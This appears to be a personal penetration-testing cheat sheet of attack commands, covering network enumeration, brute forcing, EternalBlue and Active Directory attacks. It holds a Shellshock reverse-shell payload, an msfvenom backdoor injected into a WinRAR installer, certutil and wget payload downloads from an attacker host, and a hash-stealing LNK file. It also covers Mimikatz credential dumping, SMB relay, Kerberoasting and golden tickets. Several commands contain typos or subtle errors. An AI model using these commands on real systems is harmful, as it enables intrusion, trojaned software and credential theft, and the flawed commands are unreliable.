# Enumeration
Do not forget that enumeration is the key!
## Nmap 
1. Host Discovery
```shell
nmap <Target_network>/24 -sn -oA Alive_hosts
```
* Another way for host discovery
```shell
nmap -sn -PS 21,22,25,80,445,3389,8080 -PU 137,138 -T4 <TARGET_IP>
```
* Scanning hosts in a file
```shell
nmap -iL <IPs_FILE>
```
2. Servie detection
```shell
nmap <TARGET_IP> -sV -p- -Pn -n -T5 ---min-rate=10000 -oA services
```
* You can list nmap scripts for a specific service:
```shell
ls -al /usr/share/nmap/scripts | grep -e <SERVICE>
```
3. Nmap scripts scan
```shell
nmap <Target_IP> -sC -p- -Pn -n -T5 ---min-rate=10000 
```
4. Aggresive scan
```shell
nmap <TARGET_IP> -Pn -n -T5 ---min-rate=10000 -A
```
5. Nmap scripts for a specific service
```shell
nmap <TARGET_IP> --scipt=<Service_name>* -p<Service_port> -Pn -n -T5 ---min-rate=10000
```
* NOTE: there are catagories for nmap scripts. For more info check https://nmap.org/book/nse-usage.html
6. UDP scan (top 100 ports)
```shell
nmap -F -sU --top-ports=100 <TARGET_IP>
```
* Since UPD takes longer to scan, scan the top 100
7. Firewall & IDS/IPS evasion scans
```shell
nmap <TARGET_IP> -Pn -n -p- -sA 
```
8. IP spoofing scan
```shell
nmap -S <SPOOFED_IP> <TARGET_IP> -p- -Pn -n -sA
```
9. Different source port scan
```shell
sudo nmap -g <PORT_NUMBER> <TARGET_IP> -p- -Pn -n -sS
```
10. Scanning using a taget gateway
```shell
nmap -D <TAGET_GATEWAY>, ME <TARGET> -Pn -p- -n
```
11. Minimizing MTU size
```shell
nmap -f mtu <SIZE> -p- -Pn -n <TARGET_IP>
```
12. Banner grabbing using Netcat
```shell
nc <TARGET_IP> <PORT>
```
## Web Enumeration 
* Subdomain enumeration
1. Using gobuster
```shell
gobuster dir -u http://<IP>/ -w WORDLIST
```
2. Using assetfinder
    
```shell
assetfinder <DOMAIN> >> total_subdomains.txt
```
```shell
assetfinder --subs-only <DOMAIN> >> subdmoains_only.txt
```
4. Using sublist3r
```shell
sublist3r -d <DOMAIN> -t 100
```
5. Discover web technology using whatweb
```shell
whatweb <DOMAIN>
```
6. Nikto scan
```shell
nikto -h <DOMAIN> 
```
7. Httprobe to detemine alive subdomains 
```shell
cat subdomains.txt | httprobe >> alive_subs.txt
```
8. Take a screenshot of a website
```shell
gowitness single <DOMAIN>
```
# Footprinting service
## SMB
1. Using nmap scripts to enumerate SMB
```shell
nmap -sV -p 445,139 -Pn -n --script=smb* <TARGET_IP>
```
2. SMBmap 
```shell
smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```
3. Enumerating a specific SMB share using SMBmap
```shell
smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> -r ‘SHARE_NAME$/’
```
4. Uploading file using SMBmap
```shell
smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD> --upload '/filename' 'C$/tmp/'
```
5.  Metasploit modules for enumerating SMB
```shell
auxiliary/scanner/smb/smb_version
axuliliary/scanner/smb/smb_enumshares
```
6. Enumerating SMB shares using smbclient
```shell
smbclient -L -N //<TARGET_IP>
smbclient -L -N  //<TARGET_IP>/Share_Name
```
7. Connecting to a specific share (You need credentials)
```shell
smbclient -U <USERNAME> //<TARGET_IP>/Share_Name
```
8. Enumerating SMB shares crackmapexec (Anonymous login)
```shell
crackmapexec smb <TARGET_IP> --shares -u '' -p ''
```
9. Enumerating SMB using Enum4Linux-ng
* Install the tool
```shell
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
```
* Run the tool
```shell
./enum4linux-ng.py <TARGET_IP> -A
```
10. Enumerating domain users, domain names, and more! Using rpcclient **(Login is anonymous)**
```shell
rpcclient -U "" <TARGET_IP>
```
* Queries that you can run:
*   srvinfo
*   enumdomians
*   querydominfo
*   netshareenumall
*   enumdomuser
* You can read more on https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
## FTP
1. Nmap scripts for nmap
```shell
nmap -sV -p 21 -Pn -n --script=ftp* <TARGET_IP>
```
2. Banner grabbing using Netcat
```shell
nc <Target_IP> 21
```
3. Banner grabbing using telnet
```shell
telnet <Target_IP> 21 
```
4. Ftp anonymous login
```shell
ftp <Target_IP> 
```
5. Downloading ftp files **(If anonymous login is allowed)**
```shell
wget -m --no-passive ftp://anonymous:anonymous@IP
```
## SSH
1. Banner grabbing
```shell
nc <Target_IP> 22
```
2. Nmap scripts
```shell
nmap -sV -p 22 -Pn -n --script=ssh* <TARGET_IP>
```
3. Connecting to a SSH
```shell
ssh <USERNAME>@<TARGET_IP>
```
* Using id_rsa key
```shell
ssh -i id_rsa <USERNAME>@<TARGET_IP>
```
## MySQL
1. Login to MySQL service
```shell
mysql -h <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```
2. Nmap scripts for MySQL
```shell
nmap -sV -p 3306 -Pn -n --script=mysql* <TARGET_IP>
```
3. Metasploit modules for MySQL
```shell
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login
```
## MSSQL
1. Nmap scripts for MSSQL
```shell
nmap -sV -p 1433 -Pn -n --script=mssql* <TARGET_IP>
```
2. Connecting to MSSQL
```shell
python3 mssqlclient.py <USERNAME>@<TARGET_IP> -windows-auth
```
## RDP
1. Nmap scripts for RDP
```shell
nmap -sV -sC Target -p3389 --script rdp*
```
2. Connecting to RDP
```shell
xfreerdp /u:<USERNAME> /p:"<PASSWORD>" /v:<TARGET_IP>
```
## WinRM
1. WinRM
```shell
nmap -sV -sC -p5985,5986 <TARGET_IP>
``` 
2. Connecting to WinRM
```shell
evil-winrm -i Target -u username -p password
```
# System/Host Based Attacks
## 1. Windows
### 1) Microsoft IIS
1. Brute forcing webDAV
```shell
hydra -L <USERNAME_WORDLIST>  -P <PASSWORD_WORDLIST> <TARGET_IP> http-get /webdav/
```
* After obtaining credentials, you can authenticate with davtest
```shell
davtest -auth <USERNAME>:<PASSWORD> -url http://<TARGET_IP>/webdav
```
* Uploading payload to the webserver
```shell
cadaver http://10.10.10.1/webdav
> put payload
```
* Set a listener (Netcat or Metasploit)
```shell
nc -nvlp <PORT>
```
```shell
exploit(multi/handler)
```
* Automate the proccess by using Metasploit
```shell
use exploit(windows/iis/iis_webdav_upload_asp)
```
### 2) SMB 
1. EternalBlue (MS17-010)
* Check whether the system is vulnerable
```shell
nmap -p 445  —script=smb-vuln-ms17-010 <TARGET_IP>
```
* Exploit the system using
```shell
exploit(windows/smb/ms17_010_eternalblue)
```
2. Brute forcing SMB
* Method 1
```shell
hydra -L <USERNAME_WORDLIST> -P <PASSWORD_WORDLIST> <TARGET_IP> smb
```
* Method 2
```shell
auxiliary(scanner/smb/smb_login)
```
3. Connecting to SMB
* Method 1
```shell
psexec.py <USERNAME>@<TARGET_IP> cmd.exe
```
* Method 2
```shell
exploit(windows/smb/psexec)
```
### 3) RDP
1. Brute forcing RDP
```shell
hydra -L <USERNAME_WORDLIST> -P <PASSWORD_WORDLIST> rdp://<TARGET_IP> 
```
### 4) WinRM
1. Brute forcing WinRM
```shell
crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD_WORDLIST>
```
2. Connecting to WinRM using evil-winrm
```shell
evil-winrm.rb -i <TARGET_IP> -u <USERNAME> -p <PASSWORD_WORDLIST>
```
3. Connecting WinRM using Metasploit
```shell
auxiliary(scanner/winrm/winrm_login)
exploit(windows/winrm/winrm_script_exec)
```
## 2. Linux
### 1) Shellshock
1. Manually exploiting
* Intercept (Using burp suite) and replace the **User Agent** by:
```shell
() { :; }; echo; echo; /bin/bash -c  'bash -i>&/dev/tcp/LOCAL_HOST/PORT 0>&1’
```
* Open a listener using Netcat
```shell
nc -nvlp PORT
```
2. Use Metasploit to automate the process
```bash
exploit(multi/http/apache_mod_cgi_bash_env_exec)
```
# Post exploitation
## 1. Privilege escalation
### 1) Windows 
1. Bypassing UAC using UACMe
* https://github.com/hfiref0x/UACME
* Upload UACMe to the targeted system
* Run the script!
```cmd
.\Akagai64.exe 23 C:\tmp\shell.exe
```
2. Bypassing UAC using access token key
* You must have Metasploit meterpreter session
```meterpreter
pgrep lsass
migrate to <pid>
load incognito
list_tokens -u
impersonate_token “NT Authority\Administrator"
```
### 2) Linux
1. SUID binaries
* Check https://gtfobins.github.io/
* To find SUID
```shell
find . -exec /bin/sh -p \; -quit
```
## Credential dumping
### 1) Windows
1. Mimikatz (Transfer Mimikatz.exe to the target system)
```cmd
sekurlsa::logonpasswords
lsadump::sam
```
2. Kiwi module (Metasploit)
```meterpreter
pgrep lsass
migrate <pid>
load kiwi
hashdump
```
### 2) Linux
* /etc/shadow has all passwords, copy them to a file and crack them!
```shell
hashcat -m <HASH_TYPE> -a 0 hashes.txt <WORDLIST>
```
# Random stuff
1. Creating a payload and injecting it into Winrar.exe
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -i 10 -e shakata_ga_nia -f exe -x ~/Downloads/winrar602.exe > ~/Desktop/winrar32.exe
```
2. Transferring files
* Python HTTP server
```shell
python -m SimpleHTTPServer 80
```
* To Windows
```cmd
certutil -urlcache -f http://ATTACKER_IP/payload.exe payload.exe
```
* To Linux
```shell
wget http://ATTACKER_IP/payload.exe 
```
# Useful recourse
## Enumeration scripts:
### 1. Windows:
1. WinPEAS: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
2. Seatbelt: https://github.com/GhostPack/Seatbelt
3. JAWS: https://github.com/411Hall/JAWS
### 2. Linux:
1. LinPEAS: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
2. LinEnum: https://github.com/rebootuser/LinEnum
3. Linuxprivchecker: https://github.com/sleventyeleven/linuxprivchecker


# Attacking Active Directory: Initial Attack Vectors
## LLMNR poisoning
* LLMNR is used to identify hosts when DNS fails to do so
* Previously know as NBT-NS
* Enable by default 
* Man in the middle attack by capturing NTLMv2 hashes and cracking then offline
* Responder command
``` shell
sudo responder -I eth0 -dwP
```
* Cracking NTLMv2 hashes with hashcat 
``` shell
hashcat --help | grep NTLN
hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force -O
```
* HOW to mitigate this attack? Disable LLMNR by policy + strong passwords + MAC address 
## SMB Relay attacks
* Attack method
1. Checking the SMB signing
```shell
nmap -p 445 --script=smb2-security-mode <TARGET> -Pn
```
2. Change the responder configuration file (MUST return it after done)
```shell
sudo mouspad /etc/responder/Responder.conf
##### SWITCH SMB & HTTP OFF
sudo responder -I eth0 -dwP
```
3. Run ntlmrelayx
* Dump DAM database
```shell
ntlmrelayx.py -tf targets.txt -smb2support 
```
* To gain a shell
```shell 
ntlmrelayx.py -tf targets.txt -smb2support -i 
```
4. Connecting using Netcat
```shell
nc 127.0.0.1 #(PORT FOUND BY PREVIOUS COMMAND)
```
* Once you have the hash you gain a hash you can gain access through many ways (Avoid Metasploit it is noisy and probably will be picked up)
```shell
psexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
psexec.py <USERNAME>@<TARGET_IP> -hashes (HASH)
```
## IPv6 Attacks
* Spoofing DNS requests for IPv6 
* Installing mitm6
```shell
cd /opt/mitm6
sudo pip2 intall .
```

```shell
ntlmrelayx.py -6 -t ldaps://<DOMAIN_CONTROLLER_IP> -wh fakewpad.<DOMAIN_NAME> -l OUTPUT.txt
```

```shell 
sudo mitm6 -d <DOMAIN_NAME>
```
* RUN IT FOR 5 TO 10 MIN MAXIMUM; disrupts network
* Any action on the network will make this attack successful!
* Using IoT devices
# Attacking Active Directory: Post-Compromise Enumeration
* After you compromise a domain, you need to enumerate information to understand the make up of the domain
## ldapdomaindump
```shell
mkdir <DOMAIN>
cd <DOMAIN>
sudo ldapdomaindump ldaps://<DOMAIN_IP> -u 'DOMAIN\username' -p PASSWORD
```
## Bloodhound
* YOU NEED TO LOG IN TO neo4j and the username and password is neo4j
* bloodhound username and password are the same of neo4j
```shell 
sudo pip install bloodhound
sudo neo4j console
sudo bloodhound
mkdir bloodhound
cd bloodhound
sudo bloodhound-python -d <DOMAIN_NAME> -u USERNAME -p PASSWORD -ns <DOMAIN_CONTROLLER_IP> -c all
```
## Plumhound
* YOU MUST OPEN Bloodhound & neo4j
* Installing the tool
```shell
cd /opt
sudo git clone https://github.com/PlumHound/PlumHound.git
cd /Plumhound
sudo pip3 install -r requirements.txt
sudo python3 PlumHound.py -x tasks/defualt.tasks -p <YOUR_NEOJ4_PASSWORD>
cd repots
firefox index.html
```
# Attacking Active Directory: Post-Compromise Attacks
## Pass attacks
* Literally just use the password/hash and pass it to other services to check whether it works 
```shell
crackmapexec smb <TARGET_IP/CIDR> -u <USERNAME> -d <DOMAIN> -p <PASSWORD>
crackmapexec smb <TARGET_IP/CIDR> -u <USERNAME> -H <HASH> --local-auth
```
* Hash dumping 
```shell
secretsdump.py DOMAIN/USERNAME:PASSWORD@<TARGET_IP>
```
## Kerberoasting attack
* After obtaining the hashed password of any account you can send it to the Kerberos service (on the domain controller) and gain the TGS and crack it to gain the password of the service account
* Attack
```shell
sudo GetUserSPN.py DOMAIN/USERNAME:PASSWORD -dc-ip <TARGET_IP> -request
```
* Be careful of honeypots account
* Hashcat
```shell
hashcat -m 13100 hashed.txt /usr/share/wordlists/rockyou.txt
```
## LNK file attacks
* Creating a file that will connect to our attacker machine and dump the hashes on the victim machine
* You must be an Administrator
* Creating the file using Powershell
```Powershell
$objShell = New-Object -ComObject WScript.shell 
$lnk = $objShell.CreateShortcut("C:\test.lnk") 
$lnk.TargetPath = "\\<ATTACKER_IP>\@test.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T" 
$lnk.Save()
```
* Creating the file using Netexec
```shell
netexec smb <TARGET_IP> -d <DOMAIN> -u <V_USERNAME> -p <V_PASSWORD> -M slinky -o NAME=test SERVER=<ATTACKER_IP>
```

## GPP attack/cPassword attacks
* Using Metasploit!
```
search smb_enum_gpp
```
## Mimikatz
1. Obfuscate Mimikatz
```shell
msfvenom -p windows/mimikatz_reverse_tcp LHOST=<ATTACKER IP> LPORT=<PORT> -f exe -e shikata_ga_nai -i 10 -o OM.exe
```
2. Dumping LSASS (After transfering the obfuscated Mimikatz to the target)
```shell
privilege::debug
sekurlsa::logonpasswords
```
# We've Compromised the Domain - Now What?
## NTDS.dit dumping
```shell
secretsdump.py DOMAIN/DC_USERNAME:'<PASSWORD>'@<TARGET_IP> --just-dc-ntlm
```
* User MUST be a domain admin
* Hashcat
```shell
hashcat -m 1000 NTDS.txt /usr/share/wordlists/rockyou.txt
```
## Golden ticket
* Compromising the krbgt account means we own the domain
* Accessing all accounts!  
* After compromising a Domain Controller (transfer Mimikatz and run this attack)
``` shell
privilege::debug
lsadump::lsa /inject
kerberos::golden /user:<user> /domain:<domain> /sid:<domain SID> /krbtgt:<krbtgt hash> /id:500
```
# Post Exploitation 
## Pivoting 
1. Proxychains
```shell
cat /etc/proxychains.conf
ssh -f -N -D <Port_found_in_previous_step> -i id_rsa root@<IP>
```
* You can run commands such as
```shell
proxychains <TOOL> 
```
2. sshuttle
```shell
sudo pip install sshuttle
sshuttle -r root@<IP_VICTIM> <IP/CIDR> --ssh-cmd "ssh -i id_rsa"












